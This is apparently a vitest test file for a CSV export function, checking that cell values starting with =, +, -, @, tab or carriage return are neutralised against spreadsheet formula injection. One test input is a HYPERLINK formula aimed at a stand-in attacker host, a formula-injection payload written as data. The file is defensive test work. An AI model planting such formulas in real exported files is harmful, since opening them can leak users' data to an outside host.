/**
 * Tests for collection export, focused on CSV formula-injection hardening.
 *
 * Card fields (title, summary, year, ...) come from untrusted remote
 * collections. When exported to CSV and opened in a spreadsheet, a cell
 * beginning with `=`, `+`, `-`, `@`, TAB or CR is evaluated as a formula.
 * These tests assert such values are neutralised.
 */

import { describe, it, expect } from "vitest";
import { exportToCSV } from "@/lib/collectionExport";
import type { Collection, CardData } from "@/schemas";

function collectionWith(items: CardData[]): Collection {
  return { items, categories: [] };
}

/** The cells of the first data row (after the header line). */
function dataCells(csv: string): string[] {
  const lines = csv.split("\n");
  return (lines[1] ?? "").split(",");
}

describe("exportToCSV formula-injection neutralisation", () => {
  it("neutralises a value beginning with '=' so it cannot be evaluated", () => {
    const csv = exportToCSV(
      collectionWith([
        { id: "a", title: '=HYPERLINK("https://evil.example/?c=","x")' },
      ])
    );

    // The title cell must not begin with '=' (would be an active formula).
    const titleCell = dataCells(csv).find((c) => c.includes("HYPERLINK"));
    expect(titleCell).toBeDefined();
    expect(titleCell?.startsWith("=")).toBe(false);
    // A quoted cell must not begin with a quoted formula lead either.
    expect(titleCell?.startsWith('"=')).toBe(false);
  });

  it.each([
    ["plus", "+1+1"],
    ["minus", "-1+1"],
    ["at", "@SUM(A1:A9)"],
    ["tab", "\t=1+1"],
    ["carriage-return", "\r=1+1"],
  ])("neutralises a value beginning with %s", (_label, payload) => {
    // Fields sort alphabetically -> ["id", "title"], so the row is
    // `x,<titleCell>`; strip the known id cell to isolate the title cell.
    const csv = exportToCSV(collectionWith([{ id: "x", title: payload }]));
    const row = csv.split("\n")[1] ?? "";
    const titleCell = row.replace(/^x,/, "");
    // The title cell may not begin with a bare formula-lead character...
    expect(/^[=+\-@\t\r]/.test(titleCell)).toBe(false);
    // ...nor with one immediately inside an opening quote wrapper.
    expect(/^"[=+\-@\t\r]/.test(titleCell)).toBe(false);
  });

  it("leaves ordinary values unchanged", () => {
    const csv = exportToCSV(
      collectionWith([{ id: "1", title: "Hello World", year: "1999" }])
    );
    const cells = dataCells(csv);
    expect(cells).toContain("Hello World");
    expect(cells).toContain("1999");
  });

  it("still quotes and escapes structural CSV characters", () => {
    const csv = exportToCSV(collectionWith([{ id: "1", title: 'a,b"c' }]));
    // Comma forces quoting; embedded quote is doubled.
    expect(csv).toContain('"a,b""c"');
  });
});
